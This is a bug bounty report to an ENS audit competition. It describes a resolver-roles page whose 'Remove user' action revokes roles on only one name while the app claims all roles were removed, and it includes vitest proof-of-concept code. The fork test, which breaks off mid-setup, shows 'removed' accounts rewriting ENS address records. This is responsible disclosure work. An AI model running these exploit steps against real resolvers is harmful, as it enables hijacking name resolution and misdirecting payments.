# 89990 w a critical resolver roles page revokes a single name while claiming removal of all roles removed users keep live record write authority on other names and root

## #89990 \[W\&A-Critical] Resolver roles page revokes a single name while claiming removal of all roles — removed users keep live record-write authority on other names and ROOT

**Submitted on Aug 22nd 2026 at 10:38:22 UTC by @pizzalover337 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #89990
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves

### Description

## Summary

The Explorer app's resolver-roles management page (`/resolver/$address/roles`) collapses **all** role records of one account across **all** resources of a resolver (a *resource* is one grant target: a specific name on that resolver, or ROOT — every name it serves) into a single table row, but encodes every edit and every removal against **exactly one** derived resource.

What the admin sees:

* One row per account; its Name column lists *every* scoped name as badges (`ResolverRolesTable.tsx:66-84`).
* The edit sidebar asserts the union scope verbatim: **"Global roles (all names)"** when any root-scoped record exists, otherwise **"Roles scoped to a.eth, b.eth, …"** (`ResolverRolesSidebar.tsx:391-397`).
* The **Remove user** confirmation dialog promises: *"Are you sure you want to remove this user from all roles? This action cannot be undone."* (`:444-449`).

What the app submits:

```ts
// ResolverRolesSidebar.tsx:169
const roleName = resolvedNames.find((n) => n !== '(root)') ?? ''
```

One name. Both `handleSaveChanges` (`:295-305`) and `handleRemoveUser` (`:307-323`) pass this single `roleName` into the real encoders. A non-empty name encodes `authorizeNameRoles(<one name>, <union bitmap>, <account>, true/false)`; an empty one falls through to `grantRootRoles`/`revokeRootRoles`. There is no loop over resources anywhere in the flow.

The result is a **silent under-revocation primitive**: an admin who removes a user from a resolver — with the UI asserting global/multi-name scope at every step — actually revokes the account's roles on **one** name only. Every other resource the account held — other names sharing that resolver, and the **ROOT (all-names) scope** itself in mixed rows — survives fully intact on-chain. The "removed" user retains live authority to rewrite address/text/contenthash records of those names indefinitely.

This is executed end-to-end against a fork of the live Sepolia deployment using the app's own grant/revoke encoders and transaction pipeline (see PoC):

* **Kill chain 1 (two-name row):** grants `ROLE_SET_ADDR` on `a.eth` and `b.eth`; the app-produced "Remove user" bytes revoke the `a.eth` resource only; on-chain reads confirm `hasRoles(a.eth)=false, hasRoles(b.eth)=true` after the success screen — and the "removed" account then rewrites `b.eth`'s `addr` record to its own address (tx lands; read-back confirms).
* **Kill chain 2 (the worst row):** a ROOT-scoped `ROLE_SET_ADDR` plus a `b.eth`-scoped `ROLE_SET_TEXT` renders as **"Global roles (all names)"**; removal encodes the *name* scope only; the ROOT grant survives untouched, and the "removed" account writes the resolution of a **third name that was never part of any grant**.

A control case proves the app handles single-resource rows correctly — the defect is specifically the multi-resource collapse.

## Impact

**Medium** — broken authorization revocation: the application displays one scope of action while submitting a strictly narrower one, leaving state-modifying authority (ENS record writes) in the hands of a user the victim explicitly and successfully revoked.

Victim and attacker are ordinary participants in a normal workflow: an organization points several ENS names at one shared resolver (first-class in this app — the roles page is built around the resolver's node list, and pointing names at a shared resolver is a supported operation), grants a contractor/team-member record-write roles per name (or accepts the sheet's default ROOT scope), and later offboards them through "Remove user". Every step the admin takes is verified against what the app shows; the loss is that the shown scope and the submitted scope diverge, silently, in the unsafe direction.

Concretely, post-"removal" the ex-grantee can:

1. Rewrite `addr`/`text`/`contenthash` records of every name on the resolver they were *not* revoked from (executed: `setAddr(b.eth) → attacker`).
2. With the mixed root+name row (the sheet's default scope is ROOT — `ResolverAddUserSheet.tsx:39,127`), keep **resolver-wide** write authority despite the dialog's explicit "remove this user from all roles" promise (executed: `setAddr(third.example.eth) → attacker` on a never-granted name).

Because resolution is the trust anchor between ENS names and funds (payments to `company.eth` land wherever `addr` says), retained write authority over an organization's names is a standing hijack primitive, not a display nit.

Escalation note (not claimed): depending on the program's non-Critical tier definitions, this may equally fit a broken-access-control/authorization title at High — the claim above deliberately matches the executed evidence without stretching (see PoC for the exact on-chain end state).

### Preconditions

* A resolver serving ≥2 nodes with an account holding roles on ≥2 resources (two per-name grants, or any root-scoped grant plus a name-scoped one — the AddUserSheet defaults to ROOT, making mixed rows the common case).
* No crafted input, no lure, no race: the admin performs the standard offboarding flow on data the app itself assembled and displayed.

### Not reachable elsewhere

There is no alternative management surface: the embedded per-name view mounts the same table read-only (`NameResolverRolesOverviewTable.tsx:96-103`: `canManageRoles={false}` + `disableEdit`). The collapsed resolver page is the **only** place these roles can be edited or revoked.

## Root cause

1. **Grouping unions resources per account** — `apps/portal/src/lib/roles/resolverRoles.ts:179-221`: `groupRolesByAccount` merges every `(resource, bitmap)` record of one account into `{resolvedNames: Set<'(root)' | name>, decodedRoles: union}`.
2. **The table and sidebar present the union** — `ResolverRolesTable.tsx:102-105` feeds the groups to the table; Name column renders all names (`:66-84`); sidebar scope line `ResolverRolesSidebar.tsx:391-397`.
3. **Edits derive exactly one scope** — `ResolverRolesSidebar.tsx:169` picks the first non-root name (empty string ⇒ root scope); `handleSaveChanges` `:295-305` and `handleRemoveUser` `:307-323` pass it unchanged to the mutations; the permission matrix shows the union bitmap while changes apply to one resource only.
4. **Encoders faithfully encode the single scope** — `grantResolverRoles.ts:45-61` / `revokeResolverRoles.ts:45-61`: `name === ''` → `*RootRoles(bitmap, account)`; otherwise `authorizeNameRoles(dns(name), bitmap, account, true/false)`. The divergence is upstream of the encoders.
5. **Which single name gets revoked is arbitrary** — `roleName` takes whichever non-root name happens to be first in the indexer's record order (`Set` insertion in `groupRolesByAccount`, `resolverRoles.ts:199-214`) — not the "primary" or alphabetically-first name; from the admin's perspective any one of the displayed names may be the survivor.
6. **No post-check** — success is receipt-only; `pollForIndexerSync` refreshes the union view, so the surviving roles simply re-render as still-present checkboxes under a "success" modal.

On self-correction: because the surviving roles stay visible in the collapsed row, an admin who re-opens the page, notices the leftover row, and repeats Remove can eventually clear each remaining resource one dialog at a time. The defect stands regardless: the first removal was executed under an explicit "remove this user from all roles" promise and reported success, and nothing signals that repetition is required. Worse, a mixed root+name row silently degrades into a name-scoped row whose remaining root authority the name-scope entrypoint never addresses.

## Why this is not a known issue

The program's Known Issues list was swept (security entries R2-01…R3-08, `SEC-*`, `EXP-*`, QA-01…10, `WEB-*` tracker): none touches the resolver-roles page, role-grouping, or revocation scoping. Nearest items are different surfaces with different root causes: QA-01/WEB-1257 (registry-role breakage after name/parent transfers) and WEB-1305 (transferring roles to a V1 name hangs) — all registry-side, none on the resolver-roles page; WEB-1249 (subname creation replacing a child registry) likewise shares nothing. The owner-fallback resolution issue previously reported from this competition (#89728) shares nothing with this mechanism.

### Proof of Concept

Two vitest suites against the audited revision (commit `cda79ac`, source identical to upstream audited revision `63772fd8…`). The unit leg drives the **real rendered components** (real grouping logic, real table/sidebar/dialogs, real grant/revoke encoders) with mocks confined to external boundaries (full inventory in the unit file's header comment). The fork leg executes the app-produced bytes on-chain against a real PermissionedResolver deployed through the real VerifiableFactory on a fork of live Sepolia. No project logic is mocked.

### Prerequisites

* Node v22+, pnpm v10 (`corepack enable`)
* foundry's `anvil` on PATH (or `ANVIL_BIN` env pointing at it)
* Network access to a public Sepolia RPC (default `https://ethereum-sepolia-rpc.publicnode.com`)
* The fork test spawns its own anvil on port 8558 (`lsof -iTCP:8558` should be free)

### Setup

```bash
git clone https://github.com/immunefi-team/audit-comp-ens
cd audit-comp-ens
git checkout cda79acaad59711b943fc68207ebb3f1d0ff8596   # tree == audited revision 63772fd8…
pnpm install --frozen-lockfile
mkdir -p apps/portal/poc
# save the two files below into apps/portal/poc/
```

### Unit leg (no network)

```bash
cd apps/portal && node_modules/.bin/vitest run poc/resolverRoleScopeCollapse.unit
```

Expected output:

```
 ✓ poc/resolverRoleScopeCollapse.unit.test.tsx (4 tests)
     ✓ control: a SINGLE-name row removes exactly that name (correct behavior)
     ✓ CORE (two names): row claims "scoped to a.eth, b.eth"; Remove encodes a.eth ONLY — b.eth authority survives by construction
     ✓ WORST CASE (root+name mix): row claims "Global roles (all names)"; Remove encodes the NAME only — the ROOT grant survives untouched
     ✓ SAVE path diverges too: unchecking one union checkbox revokes on the derived name only
 Test Files  1 passed (1)
      Tests  4 passed (4)
```

Console trace from a run:

```
[resolver-scope-collapse] CONTROL single-name row: authorizeNameRoles(b.eth, …, false) — correct, the app handles one-resource rows right
[resolver-scope-collapse] CORE two-name row: UI showed {a.eth, b.eth} + "remove from all roles"; calldata = authorizeNameRoles(a.eth, 0x11, grantee, false) — NO call touches b.eth; ROLE_SET_TEXT on b.eth survives on-chain
[resolver-scope-collapse] WORST CASE: UI asserted "Global roles (all names)" + "remove from all roles"; calldata = authorizeNameRoles(b.eth, 0x11, grantee, false) — the ROOT-scoped ROLE_SET_TEXT (valid on EVERY name using this resolver) is not even addressed
[resolver-scope-collapse] SAVE path: scope header claimed {a.eth, b.eth}; revoke landed on a.eth only
```

### Fork leg (spawns anvil fork of live Sepolia)

```bash
cd apps/portal && ANVIL_BIN=$(command -v anvil) node_modules/.bin/vitest run poc/resolverRoleScopeCollapse.fork
```

Expected output:

```
 ✓ poc/resolverRoleScopeCollapse.fork.test.ts (2 tests)
     ✓ KILL CHAIN 1 (two-name row): remove revokes a.eth only; "removed" user rewrites b.eth resolution
     ✓ KILL CHAIN 2 (root+name mix, "Global roles (all names)"): ROOT grant survives removal; attacker writes a third name
 Test Files  1 passed (1)
      Tests  2 passed (2)
```

Console trace from a full run at fork block 11542313:

```
[resolver-scope-collapse:fork] pinned Sepolia block: 11542313
[resolver-scope-collapse:fork] deployed owned PermissionedResolver 0xE69632F337372DD5FEEeD4cAe227C59087deADaa (tx=0x5ee7c42a…)
[resolver-scope-collapse:fork] granted [ROLE_SET_ADDR] scope=a.eth to 0x9508b24C58f94F5DF142D51794a49735eEEd61DA
[resolver-scope-collapse:fork] granted [ROLE_SET_ADDR] scope=b.eth to 0x9508b24C58f94F5DF142D51794a49735eEEd61DA
[resolver-scope-collapse:fork] Remove user executed: name='a.eth' roles=[ROLE_SET_ADDR]
[resolver-scope-collapse:fork] POST-REMOVE on-chain truth: hasRoles(a.eth, ROLE_SET_ADDR)=false; hasRoles(b.eth, ROLE_SET_ADDR)=true — the app reported full removal
[resolver-scope-collapse:fork] KILL CHAIN 1 EXECUTED: "removed" 0x9508b24C… set b.eth's addr → 0x9508b24C… ; a.eth write reverts as expected. The admin confirmed a dialog promising removal from ALL roles.
[resolver-scope-collapse:fork] granted [ROLE_SET_ADDR] scope=ROOT to 0x79B0fd191e2192e7f6BC6c9e3F586d7c74ac14f8
[resolver-scope-collapse:fork] granted [ROLE_SET_TEXT] scope=b.eth to 0x79B0fd191e2192e7f6BC6c9e3F586d7c74ac14f8
[resolver-scope-collapse:fork] Remove user executed: name='b.eth' roles=[ROLE_SET_ADDR,ROLE_SET_TEXT]
[resolver-scope-collapse:fork] KILL CHAIN 2 EXECUTED: ROOT ROLE_SET_ADDR survived removal (true); "removed" 0x79B0fd19… wrote third.example.eth → 0x79B0fd19…
```

### How to read the result

* **Unit leg, control** — single-resource rows encode correctly; the defect is specifically the multi-resource collapse.
* **Unit leg, CORE / WORST CASE / SAVE** — the real rendered sidebar asserts union scope ("Roles scoped to a.eth, b.eth" / "Global roles (all names)", dialog: "remove this user from all roles") while the captured intent — produced by the app's own mutation flow and encoder for exactly this fixture — addresses one name only.
* **Fork leg, kill chains** — grants go through the app's own sheet code path (`grantResolverRoles`). The removal bytes are built by the app's own `prepareRevokeResolverRolesTransaction` using the sidebar-derived name (`ResolverRolesSidebar.tsx:169`) and the fixture's actual role union (`[ROLE_SET_ADDR]` for Kill Chain 1, `[ROLE_SET_ADDR, ROLE_SET_TEXT]` for Kill Chain 2). On-chain `hasRoles` reads prove the surviving authority *after* the success state; the harm leg is the "removed" account writing resolution records with its own key.
* **Disclosed test accommodations** — (1) the test-owned resolver is initialized with manager+admin role bitmaps (the app's own owned-resolver initializer passes the manager bitmap; admin bits added so grant/revoke legs are authorized — mirrors any real resolver admin); (2) the app's EOA transport submits with a bare `from` (viem asks the node to sign), so the admin is anvil-impersonated — submitted `from/to/data` are entirely app-produced bytes; attackers sign their own writes with real keys; (3) record writes need no registry registration (PermissionedResolver writes are role-gated), asserted empirically.

***

### PoC file (poc/resolverRoleScopeCollapse.unit.test.tsx)

```tsx
/**
 * PoC (unit leg) — "resolver-roles scope collapse".
 *
 * THE DEFECT UNDER TEST
 *   The portal resolver-roles page groups role records PER ACCOUNT across ALL
 *   resources of a resolver (groupRolesByAccount, lib/roles/resolverRoles.ts),
 *   renders one row whose Name column lists every scoped name and whose edit
 *   sidebar asserts the union scope ("Global roles (all names)" /
 *   "Roles scoped to a.eth, b.eth" — ResolverRolesSidebar.tsx:391-397), and a
 *   Remove-user dialog promising "remove this user from all roles" (:444-449).
 *   But every grant/revoke derives exactly ONE resource:
 *     roleName = resolvedNames.find((n) => n !== '(root)') ?? ''   (:169)
 *   so "Remove user" encodes revokeResolverRoles for that single name only,
 *   silently leaving the account's roles on every OTHER resource (and on the
 *   ROOT resource in mixed rows) fully intact on-chain.
 *
 * REAL code under test (no mocks on the vulnerable component):
 *   - ResolverRolesTable → DataTable columns → ResolverRolesSidebar — the real
 *   components, really rendered, really clicked (scope header, permission
 *   matrix, Remove-user dialog, Save button).
 *   - grantResolverRoles / revokeResolverRoles / their prepare* builders — the
 *   real encoders the sheets call; we assert the bytes they produce.
 *   - groupRolesByAccount / buildResourceToNameMap / decodeResolverRoleBitmap —
 *   the real grouping logic fed by the real indexer data shapes
 *   (useResolverOverview.ResolverRole / ResolverNode).
 *
 * Mocks (external system boundaries ONLY):
 *   - wagmi useWalletClient/usePublicClient — wallet connection (no browser
 *     extension in happy-dom).
 *   - @ens-apps/transaction-manager transactionManager.startTransaction +
 *     waitForTransaction — the tx-submission boundary; we capture the intent
 *     and decode its calldata. (The fork leg executes these bytes on-chain.)
 *   - TransactionModal component shell — replaced by a stub that invokes the
 *     step's onStart (UI plumbing around the modal, not logic under test).
 *   - pollForIndexerSync — the post-tx indexer poll (network boundary).
 *   - EntityBadge — display-only address chip replaced by a plain span.
 */
import '@testing-library/jest-dom'
import { QueryClient, QueryClientProvider } from '@tanstack/react-query'
import { render, screen, waitFor } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import type { ReactNode } from 'react'
import {
  type Address,
  decodeFunctionData,
  getAddress,
  parseAbi,
  toHex,
} from 'viem'
import { packetToBytes } from 'viem/ens'
import { beforeEach, describe, expect, it, vi } from 'vitest'

// ---------------------------------------------------------------------------
// Fixtures
// ---------------------------------------------------------------------------

const ADMIN = getAddress('0x00000000000000000000000000000000000ad111')
const GRANTEE = getAddress('0x00000000000000000000000000000000000e6222')
const RESOLVER = getAddress('0x00000000000000000000000000000000000f3333')

const eacAbi = parseAbi([
  'function authorizeNameRoles(bytes name, uint256 roleBitmap, address account, bool authorize)',
  'function grantRootRoles(uint256 roleBitmap, address account)',
  'function revokeRootRoles(uint256 roleBitmap, address account)',
])

// ---------------------------------------------------------------------------
// Boundary mocks
// ---------------------------------------------------------------------------

const h = vi.hoisted(() => ({
  capturedIntents: [] as {
    to: Address
    data: `0x${string}`
    description: string
  }[],
}))

vi.mock('wagmi', async (importOriginal) => {
  const actual = await importOriginal<typeof import('wagmi')>()
  const { extendChainWithEns } = await import('@ensdomains/ensjs/chain')
  const { sepolia } = await import('viem/chains')
  const chain = extendChainWithEns(sepolia)
  return {
    ...actual,
    useWalletClient: () => ({
      data: { account: { address: ADMIN }, chain },
    }),
    usePublicClient: () => ({ chain }),
  }
})

vi.mock('@ens-apps/transaction-manager', async (importOriginal) => {
  const actual =
    await importOriginal<typeof import('@ens-apps/transaction-manager')>()
  return {
    ...actual,
    transactionManager: {
      ...actual.transactionManager,
      startTransaction: (
        intent: { request: { to: Address; data: `0x${string}` } },
        _signer: unknown,
        options: { description?: string },
      ) => {
        h.capturedIntents.push({
          to: intent.request.to,
          data: intent.request.data,
          description: options?.description ?? '',
        })
        return 'poc-captured-tx'
      },
    },
    waitForTransaction: async () => ({
      hash: `0x${'ab'.repeat(32)}` as `0x${string}`,
    }),
  }
})

vi.mock('@/features/transaction-manager/components/TransactionModal', () => ({
  TransactionModal: ({ transactions }: { transactions?: unknown[] }) => {
    // Stub shell: fire the step exactly like the real modal does when the
    // user confirms, then stop. All logic downstream (mutations → helpers →
    // encoders → captured submission boundary) is real.
    const t = transactions?.[0] as
      | { onStart?: () => void }
      | undefined
    if (t?.onStart) setTimeout(() => t.onStart!(), 0)
    return null
  },
}))

vi.mock('@/features/transaction-manager/hooks/useTransactionModal', () => ({
  useTransactionModal: () => ({
    openModal: vi.fn(),
    closeModal: vi.fn(),
    clearTransaction: vi.fn(),
  }),
}))

vi.mock('@/utils/query/pollForIndexerSync', () => ({
  pollForIndexerSync: async () => {},
}))

vi.mock('@/components/EntityBadge', () => ({
  EntityBadge: ({ children }: { children?: ReactNode }) => <span>{children}</span>,
}))

// ---------------------------------------------------------------------------
// Real code under test
// ---------------------------------------------------------------------------

import { ResolverRolesTable } from '@/features/resolver/components/ResolverRolesTable'
import { computeNameResource, resolverRoles } from '@/lib/roles/resolverRoles'

const LOG = (...args: unknown[]) => console.log('[resolver-scope-collapse]', ...args)

type OverviewRole = {
  readonly account: string
  readonly resource: string
  readonly roleBitmap: string
  readonly blockNumber: number
  readonly transactionHash: string | null
  readonly timestamp: number | null
  readonly name: string | null
}

const ROOT_RESOURCE =
  '0x0000000000000000000000000000000000000000000000000000000000000000'

const role = (
  resource: string,
  bits: bigint,
  account: Address = GRANTEE,
): OverviewRole => ({
  account: account.toLowerCase(),
  resource,
  roleBitmap: bits.toString(),
  blockNumber: 1,
  transactionHash: null,
  timestamp: null,
  name: null,
})

const node = (name: string) => ({
  id: namehashLite(name),
  name,
  owner: { id: ADMIN.toLowerCase() },
  resolver: { id: RESOLVER.toLowerCase(), address: RESOLVER.toLowerCase() },
})

// Minimal keccak-free node placeholder: the grouping code never inspects node
// ids, only names (buildResourceToNameMap maps resources→names).
const namehashLite = (name: string) => `0x${Buffer.from(name).toString('hex')}`

const makeWrapper =
  (client = new QueryClient({
    defaultOptions: { queries: { retry: false } },
  })) =>
  ({ children }: { children: ReactNode }) => (
    <QueryClientProvider client={client}>{children}</QueryClientProvider>
  )

const renderRolesPage = (roles: OverviewRole[], names: string[]) =>
  render(
    <ResolverRolesTable
      roles={roles as never}
      nodes={names.map(node) as never}
      resolverAddress={RESOLVER}
      canManageRoles
    />,
    { wrapper: makeWrapper() },
  )

const openSidebarAndRemove = async (): Promise<void> => {
  const editBtns = screen.getAllByLabelText('Edit user roles')
  expect(editBtns.length).toBeGreaterThan(0)
  await userEvent.click(editBtns[0]!)

  // The UI's scope claim, verbatim from ResolverRolesSidebar.tsx:391-397.
  await screen.findByText(/Global roles \(all names\)|Roles scoped to /)

  await userEvent.click(screen.getByRole('button', { name: /Remove user/ }))
  // The dialog's promise, verbatim from :444-449.
  await screen.findByText(/remove this user from all roles/i)
  await userEvent.click(
    screen.getAllByRole('button', { name: /^Remove$/ }).at(-1)!,
  )
}

const lastIntent = () => {
  expect(h.capturedIntents.length).toBeGreaterThan(0)
  return h.capturedIntents.at(-1)!
}

beforeEach(() => {
  h.capturedIntents.length = 0
})

describe('unit leg: multi-resource rows encode single-resource revokes', () => {
  it('control: a SINGLE-name row removes exactly that name (correct behavior)', async () => {
    renderRolesPage(
      [
        role(computeNameResource('b.eth'), resolverRoles.ROLE_SET_ADDR),
      ],
      ['b.eth'],
    )
    await screen.findByText('b.eth')

    await openSidebarAndRemove()
    await waitFor(() => expect(h.capturedIntents.length).toBe(1))

    const intent = lastIntent()
    expect(intent.to.toLowerCase()).toBe(RESOLVER.toLowerCase())
    const decoded = decodeFunctionData({ abi: eacAbi, data: intent.data })
    expect(decoded.functionName).toBe('authorizeNameRoles')
    const [nameArg, bitmap, account, authorize] = decoded.args as [
      `0x${string}`,
      bigint,
      Address,
      boolean,
    ]
    expect(nameArg).toBe(toHex(packetToBytes('b.eth')))
    expect(bitmap).toBe(resolverRoles.ROLE_SET_ADDR)
    expect(account.toLowerCase()).toBe(GRANTEE.toLowerCase())
    expect(authorize).toBe(false)
    LOG(
      'CONTROL single-name row: authorizeNameRoles(b.eth, …, false) — correct, the app handles one-resource rows right',
    )
  })

  it('CORE (two names): row claims "scoped to a.eth, b.eth"; Remove encodes a.eth ONLY — b.eth authority survives by construction', async () => {
    renderRolesPage(
      [
        role(computeNameResource('a.eth'), resolverRoles.ROLE_SET_ADDR),
        role(computeNameResource('b.eth'), resolverRoles.ROLE_SET_TEXT),
      ],
      ['a.eth', 'b.eth'],
    )
    // One collapsed row displays BOTH names…
    await screen.findByText('a.eth')
    expect(screen.getByText('b.eth')).toBeInTheDocument()

    await openSidebarAndRemove()
    // …and the dialog promised "remove this user from all roles", yet:
    await waitFor(() => expect(h.capturedIntents.length).toBe(1))

    const intent = lastIntent()
    const decoded = decodeFunctionData({ abi: eacAbi, data: intent.data })
    expect(decoded.functionName).toBe('authorizeNameRoles')
    const [nameArg, bitmap, account, authorize] = decoded.args as [
      `0x${string}`,
      bigint,
      Address,
      boolean,
    ]
    expect(account.toLowerCase()).toBe(GRANTEE.toLowerCase())
    expect(authorize).toBe(false)
    // Union bitmap (both held roles) but ONE name:
    expect(bitmap & resolverRoles.ROLE_SET_ADDR).not.toBe(0n)
    expect(bitmap & resolverRoles.ROLE_SET_TEXT).not.toBe(0n)
    expect(nameArg).toBe(toHex(packetToBytes('a.eth')))
    expect(nameArg).not.toBe(toHex(packetToBytes('b.eth')))
    LOG(
      'CORE two-name row: UI showed {a.eth, b.eth} + "remove from all roles"; calldata = ' +
        `authorizeNameRoles(a.eth, 0x${bitmap.toString(16)}, grantee, false) — ` +
        'NO call touches b.eth; ROLE_SET_TEXT on b.eth survives on-chain',
    )
  })

  it('WORST CASE (root+name mix): row claims "Global roles (all names)"; Remove encodes the NAME only — the ROOT grant survives untouched', async () => {
    renderRolesPage(
      [
        role(ROOT_RESOURCE, resolverRoles.ROLE_SET_TEXT),
        role(computeNameResource('b.eth'), resolverRoles.ROLE_SET_ADDR),
      ],
      ['b.eth'],
    )
    await screen.findByText('b.eth')

    // Open sidebar and verify the global claim verbatim before removing.
    const editBtns = screen.getAllByLabelText('Edit user roles')
    await userEvent.click(editBtns[0]!)
    expect(
      await screen.findByText('Global roles (all names)'),
    ).toBeInTheDocument()

    await userEvent.click(screen.getByRole('button', { name: /Remove user/ }))
    await screen.findByText(/remove this user from all roles/i)
    await userEvent.click(
      screen.getAllByRole('button', { name: /^Remove$/ }).at(-1)!,
    )
    await waitFor(() => expect(h.capturedIntents.length).toBe(1))

    const intent = lastIntent()
    const decoded = decodeFunctionData({ abi: eacAbi, data: intent.data })
    // Despite the "Global" claim, NO root-scoped entrypoint is used:
    expect(decoded.functionName).toBe('authorizeNameRoles') // not revokeRootRoles
    const [nameArg, bitmap] = decoded.args as [`0x${string}`, bigint]
    expect(nameArg).toBe(toHex(packetToBytes('b.eth')))
    expect(bitmap & resolverRoles.ROLE_SET_TEXT).not.toBe(0n)
    LOG(
      'WORST CASE: UI asserted "Global roles (all names)" + "remove from all roles"; ' +
        `calldata = authorizeNameRoles(b.eth, 0x${bitmap.toString(16)}, grantee, false) — ` +
        'the ROOT-scoped ROLE_SET_TEXT (valid on EVERY name using this resolver) is not even addressed',
    )
  })

  it('SAVE path diverges too: unchecking one union checkbox revokes on the derived name only', async () => {
    renderRolesPage(
      [
        role(computeNameResource('a.eth'), resolverRoles.ROLE_SET_ADDR),
        role(computeNameResource('b.eth'), resolverRoles.ROLE_SET_TEXT),
      ],
      ['a.eth', 'b.eth'],
    )
    await screen.findByText('b.eth')

    await userEvent.click(screen.getAllByLabelText('Edit user roles')[0]!)
    await screen.findByText(/Roles scoped to a\.eth, b\.eth/)

    // The permission matrix renders the UNION: "Set Address" is checked
    // because a.eth holds it. Uncheck it — an admin reading "scoped to
    // a.eth, b.eth" believes they remove it everywhere.
    const checkboxes = screen.getAllByRole('checkbox')
    const setAddressManager = checkboxes.find(
      (cb) => (cb as HTMLInputElement).id === 'ROLE_SET_ADDR-manager',
    )!
    expect(setAddressManager).toBeInTheDocument()
    expect(setAddressManager).toBeChecked()

    await userEvent.click(setAddressManager)
    const save = await screen.findByRole('button', { name: /^Save$/ })
    await waitFor(() => expect(save).toBeEnabled())
    await userEvent.click(save)
    await waitFor(() => expect(h.capturedIntents.length).toBe(1))

    const intent = lastIntent()
    const decoded = decodeFunctionData({ abi: eacAbi, data: intent.data })
    expect(decoded.functionName).toBe('authorizeNameRoles')
    const [nameArg] = decoded.args as [`0x${string}`]
    expect(nameArg).toBe(toHex(packetToBytes('a.eth')))
    LOG(
      'SAVE path: scope header claimed {a.eth, b.eth}; revoke landed on a.eth only',
    )
  })
})
```

***

### PoC file (poc/resolverRoleScopeCollapse.fork.test.ts)

```ts
/**
 * PoC (fork leg) — "resolver-roles scope collapse", executed on-chain.
 *
 * Forks live Sepolia and runs the exact transaction bytes the portal's
 * resolver-roles UI produces (real portal encoders, real transaction-manager
 * submission) against a real PermissionedResolver deployed through the real
 * VerifiableFactory.
 *
 * KILL CHAINS EXECUTED
 *   1. Two-name row: grantee holds ROLE_SET_ADDR on BOTH a.eth and b.eth
 *      (two normal per-name grants, the app's own AddUserSheet path).
 *      "Remove user" (sidebar derives ONE name — ResolverRolesSidebar.tsx:169)
 *      revokes a.eth only; ROLE_SET_ADDR on b.eth survives on-chain and the
 *      "removed" user rewrites b.eth's addr record to their own address.
 *   2. Root+name mix (the "Global roles (all names)" row): grantee holds a
 *      ROOT-scoped ROLE_SET_ADDR plus a b.eth-scoped ROLE_SET_TEXT. Remove-user
 *      revokes the NAME scope only; the ROOT grant survives and the "removed"
 *      user writes the addr record of a THIRD name never part of any grant.
 *
 * Mocks: NONE on the vulnerable component. The only harness accommodations:
 *   - The owned resolver is deployed with the admin holding BOTH the manager
 *     and admin nibble bitmaps (the app's own owned-resolver initializer
 *     passes the manager bitmap 0x1111…1 — apps/manager
 *     ensureOwnedPermRes/permissionedResolverAddress.ts — we add the +128
 *     admin half so the grant/revoke legs are authorized; this mirrors a
 *     real resolver admin and is setup, not the defect).
 *   - The app's EOA transport submits with a bare `from` (viem then asks the
 *     NODE to sign), so the admin is anvil-impersonated; the submitted
 *     from/to/data are entirely the app-produced bytes. The attacker signs
 *     their own writes with a real key.
 *   - Node hashes need no registry registration: PermissionedResolver record
 *     writes are role-gated, not registry-gated (asserted empirically below).
 */
import { spawn, type ChildProcess } from 'node:child_process'
import { setTimeout as delay } from 'node:timers/promises'
import {
  type Address,
  type Hex,
  createPublicClient,
  createTestClient,
  createWalletClient,
  decodeEventLog,
  encodeAbiParameters,
  encodeFunctionData,
  http,
  keccak256,
  namehash,
  parseAbi,
  stringToHex,
  toHex,
} from 'viem'
import { generatePrivateKey, privateKeyToAccount } from 'viem/accounts'
import { packetToBytes } from 'viem/ens'
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest'
import { getChainContractAddress } from '@ensdomains/ensjs/chain'

const LOG = (...args: unknown[]) => console.log('[resolver-scope-collapse:fork]', ...args)

const UPSTREAM_RPC = 'https://ethereum-sepolia-rpc.publicnode.com'
const ANVIL_PORT = 8558
const ANVIL_URL = `http://127.0.0.1:${ANVIL_PORT}`
const ANVIL_BIN = process.env.ANVIL_BIN ?? 'anvil'

const eacAbi = parseAbi([
  'function hasRoles(uint256 resource, uint256 rolesBitmap, address account) view returns (bool)',
  'event RolesChanged(uint256 indexed resource, address indexed account, uint256 oldRoleBitmap, uint256 newRoleBitmap)',
])
const factoryAbi = parseAbi([
  'function deployProxy(address implementation, uint256 salt, bytes data) returns (address)',
  'event ProxyDeployed(address indexed sender, address indexed proxyAddress, uint256 salt, address implementation)',
])
const resolverAbi = parseAbi([
  'function initialize(address admin, uint256 roleBitmap, bytes[] setters)',
  'function setAddr(bytes32 node, address a)',
  'function setAddr(bytes32 node, uint256 coinType, address a)',
  'function addr(bytes32 node) view returns (address)',
])

const OWNED_RESOLVER_ID = keccak256(stringToHex('OwnedResolver'))
// The app's ALL_ROLES is a 128-bit literal: nibbles 0..31 → manager bits
// 0,4,…,124 (apps/manager permissionedResolverAddress.ts). Admin bits live
// at +128; we add them so the provisioned admin can administer roles too.
const ALL_MANAGERS = BigInt(`0x${'1'.repeat(32)}`)
const ALL_ADMIN = ALL_MANAGERS << 128n
const FULL_BITMAP = ALL_MANAGERS | ALL_ADMIN

const computeOwnedResolverSalt = (owner: Address, version: bigint = 0n): bigint =>
  BigInt(
    keccak256(
      encodeAbiParameters(
        [
          { name: 'id', type: 'bytes32' },
          { name: 'owner', type: 'address' },
          { name: 'version', type: 'uint256' },
        ],
        [OWNED_RESOLVER_ID, owner, version],
      ),
    ),
  )

const dnsName = (name: string) => toHex(packetToBytes(name))

let anvil: ChildProcess | null = null
let publicClient: ReturnType<typeof createPublicClient>
let testClient: ReturnType<typeof createTestClient>
let adminWallet: ReturnType<typeof createWalletClient>
let ADMIN: Address
let sepoliaWithEns: import('@/lib/wagmi').sepoliaWithEns
let grantResolverRoles: typeof import('@/features/resolver/helpers/grantResolverRoles').grantResolverRoles
let prepareRevokeResolverRolesTransaction: typeof import('@/features/resolver/helpers/revokeResolverRoles').prepareRevokeResolverRolesTransaction
let createEOASigner: typeof import('@/features/registry/utils/signer.helpers').createEOASigner

const waitReceipt = async (hash: Hex) =>
  publicClient.waitForTransactionReceipt({ hash })

// set per-test-suite resolver address
let R: Address
